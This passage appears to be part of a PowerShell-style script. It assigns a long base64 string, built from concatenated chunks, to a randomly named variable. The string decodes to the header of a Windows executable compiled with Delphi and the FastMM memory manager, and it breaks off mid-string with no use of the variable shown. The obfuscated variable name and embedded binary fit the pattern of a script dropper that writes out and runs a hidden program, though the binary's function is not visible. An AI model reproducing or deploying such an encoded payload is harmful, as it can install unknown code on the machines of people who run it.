$lGeMEPAFTZzxywY =
'TVpQAAIAAAAEAA8A//8AALgAAAAAAAAAQAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAALoQAA4ftAnNIbgBTM0hkJBUaGlzIHByb2dyYW0gbXVzdCBiZSBydW4gdW5kZXIgV2luMzINCiQ3AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFBFAABMAQcAHgcPXgAAAAAAAAAA4ACOoQsBAhkA7gIAAFoAAAAAAADwBQMAABAAAAAQAwAAAEAAABAAAAACAAAEAAAAAAAAAAQAAAAAAAAAAOATAAAEAAAAAAAAAgBAAQAAAAAAAAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA' + 
'AIATAAQVAAAA0BMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoBMATCkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGCEEwAgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAADk1AIAABAAAADWAgAABAAAAAAAAAAAAAAAAAAAIAAAYC5pdGV4dAAADBYAAADwAgAAGAAAANoCAAAAAAAAAAAA' + 
'AAAAACAAAGAuZGF0YQAAAGQXAAAAEAMAABgAAADyAgAAAAAAAAAAAAAAAABAAADALmJzcwAAAABQTRAAADADAAAAAAAACgMAAAAAAAAAAAAAAAAAAAAAwC5pZGF0YQAABBUAAACAEwAAFgAAAAoDAAAAAAAAAAAAAAAAAEAAAMAucmVsb2MAAEwpAAAAoBMAACoAAAAgAwAAAAAAAAAAAAAAAABAAABCLnJzcmMAAAAAAAAAANATAAACAAAASgMA' + 
'AAAAAAAAAAAAAAAAQAAAQAAAAAAAAAAAAAAAAADgEwAAAAAAAEwDAAAAAAAAAAAAAAAAAEAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQQQAABBEJ5dGUBAAAAAP8AAACQGBBAAAEIQ2FyZGluYWwFAAAAAP////+QMBBAABAFSW50NjQAAAAAAAAAgP////////9/kEwQQAAKBnN0cmluZ1gQQAALCldpZGVTdHJpbmewEEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + 
'AAAAALAQQAAEAAAAAAAAAOw8QAD4PEAA/DxAAAA9QAD0PEAAeDpAAJQ6QADQOkAAB1RPYmplY3S8EEAABwdUT2JqZWN0sBBAAAAAAAAAAAZTeXN0ZW0AANwQQAAPCklJbnRlcmZhY2UAAAAAAQAAAAAAAAAAwAAAAAAAAEYGU3lzdGVtAwD//8yDRCQE+OlJUgAAg0QkBPjpZ1IAAINEJAT46XFSAADMzAkRQAATEUAAHRFAAAEAAAAAAAAAAAAA' + 
'AMAAAAAAAABGKRFAAAgAAAAAAAAAjUAApBFAADURQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACkEUAADAAAAGQQQADsPEAAMGNAADxjQAAAPUAA9DxAAExjQACUOkAA0DpAABFUSW50ZXJmYWNlZE9iamVjdIvA/yUYhVMAi8D/JRSFUwCLwP8lEIVTAIvA/yUMhVMAi8D/JQiFUwCLwP8lkIRTAIvA/yUEhVMAi8D/JQCFUwCLwP8l/IRTAIvA' + 
'/yWMhFMAi8D/JfiEUwCLwP8l9IRTAIvA/yXwhFMAi8D/JeyEUwCLwP8l6IRTAIvA/yXkhFMAi8D/JeCEUwCLwP8l3IRTAIvA/yXYhFMAi8D/JdSEUwCLwP8l0IRTAIvA/yWIhFMAi8D/JcyEUwCLwP8lyIRTAIvA/yXEhFMAi8D/JXiEUwCLwP8ldIRTAIvA/yVwhFMAi8D/JcCEUwCLwP8lvIRTAIvA/yVohFMAi8D/JWSEUwCLwP8lYIRTAIvA' + 
'/yW4hFMAi8D/JbSEUwCLwP8lsIRTAIvA/yWshFMAi8D/JaiEUwCLwFODxLy7CgAAAFToUf////ZEJCwBdAUPt1wkMIvDg8REW8OLwP8lpIRTAIvA/yWghFMAi8D/JZyEUwCLwP8lhIRTAIvA/////1cAAABGYXN0TU0gQm9ybGFuZCBFZGl0aW9uIKkgMjAwNCwgMjAwNSBQaWVycmUgbGUgUmljaGUgLyBQcm9mZXNzaW9uYWwgU29mdHdhcmUg' + 
'RGV2ZWxvcG1lbnQA8A+wEcONQACLCIkKi0gEi0AIiUoEiUIIw41AAIsIiQqLSASJSgSLSAiJSgiLSAyLQBCJSgyJQhDDjUAAiwiJCotIBIlKBItICIlKCItIDIlKDItIEIlKEItIFItAGIlKFIlCGMONQADfKN9oCN9oEN9oGItIIIlKIN96GN96EN96CN86w41AAN8o32gI32gQ32gY32ggi0goiUoo33og33oY33oQ33oI3zrDkN8o32gI32gQ' + 
'32gY32gg32goi0gwiUow33oo33og33oY33oQ33oI3zrDjUAA3yjfaAjfaBDfaBjfaCDfaCjfaDCLSDiJSjjfejDfeijfeiDfehjfehDfegjfOsOQ3yjfaAjfaBDfaBjfaCDfaCjfaDDfaDiLSECJSkDfejjfejDfeijfeiDfehjfehDfegjfOsONQACD6QwByAHK99l5E98sAd9sAQjffBEI3zwRg8EQeO3fLAHfPBGLRAEIiUQRCMONQACD6QQB' + 
'yAHK99nfLAHfPBGDwQh49YsEAYkEEcOQi0gEixA50YkRiUoEdALDkIHpoDdDAInKwekDD7bWuP7////TwCEElSA3QwB14Lj+////idHTwCEFHDdDAMOLwIHqMAsAAMHqCIHq/wMAABnJIcqBwv8DAACNDNWgN0MAi1EEOcqJCIlQBIkCiUEEdAPDkJCB6aA3QwCJysHpAw+21rgBAAAA0+AJBJUgN0MAuAEAAACJ0dPgCQUcN0MAw4M9GDdDAAB1' + 
'A8OQkKEUN0MA9kD8AXUlg0j8CIsVGDdDACnQjUoDiUj8iVQC+IH6MAsAAA+DZ////8OQkLrw////I1D8gfowCwAAchLoD////6EUN0MAuvD///8jUPyLDRg3QwApyAHK67nDkFOL2OiM////agRoABAAAGjw/xMAagDozfz//4XAdE2LFQQ3QwCLyMcBADdDAKMEN0MAiVEEiQKL0IHC8P8TAIvKg+kExwECAAAAueD/EwAry4kNGDdDACvTi8Kj' + 
'FDdDAIPLAovQg+oEiRpbwzPAoxg3QwAzwFvDkIA9RTBDAAB0PespgD2tNUMAAHUgagDoZfz//7mgV0MAsgEzwOjH/P//hMB0GWoK6Ez8//+5oFdDALIBM8Dorvz//4TAdcXDkFNWV1WL6I21EAABAE6DxgSB5gAA//9qBGgAEBAAVmoA6AP8//+L2IXbdDCL+4lvCIPOBIl3DOh9////oahXQwDHB6RXQwCJHahXQwCJRwSJGMYFoFdDAACDwxCL' + 
'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' + 
